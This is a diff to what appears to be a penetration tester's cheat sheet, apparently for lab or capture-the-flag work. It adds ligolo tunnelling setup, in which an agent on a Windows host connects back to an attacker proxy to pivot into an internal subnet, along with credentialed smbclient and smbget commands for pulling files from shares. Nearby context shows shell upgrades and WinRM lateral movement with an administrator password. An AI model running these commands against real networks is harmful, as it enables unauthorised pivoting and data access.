@@ -679,6 +679,22 @@ ldapsearch.py info
 ```
 proxychains -q -f server.conf python3 ./ldapsearch-ad.py -l dc.DOMAIN.local -t info
 ```
+ligolo setup
+```
+#first time
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+#subsequent
+sudo ./proxy -selfcert -laddr 0.0.0.0:1433
+sudo ip route add 10.10.X.X/24 dev ligolo
+
+#client
+.\agent.exe -connect 10.10.14.34:1433 -ignore-cert
+
+#cleanup
+sudo ip route del 10.10.X.X/24 dev ligolo
+```
 linux qol
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
@@ -1054,6 +1070,10 @@ sharpmapexec usage - sme winrm
 upload sme.exe
 .\sme.exe ntlm winrm /user:DOMAIN\administrator /password:P@ssw0rd /computername:server.DOMAIN.local
 ```
+smbclient usage
+```
+smbclient -U "domain.local\usedname%password" \\\\fileshare.domain.local\\sharename
+```
 smbmap usage
 ```
 proxychains -q -f nextcloud.conf smbmap -u 'hola' -p 'P@ssw0rd' -H 192.168.20.10
@@ -1061,6 +1081,7 @@ proxychains -q -f nextcloud.conf smbmap -u 'hola' -p 'P@ssw0rd' -H 192.168.20.10
 smbget usage
 ```
 smbget --recursive smb://authority.htb/Development/Automation/Ansible/PWM --user 'fake'%''
+smbget smb://fileshare.domain.local/sharename/file.txt --user 'domain.local\username%password'
 ```
 sql enum
 ```
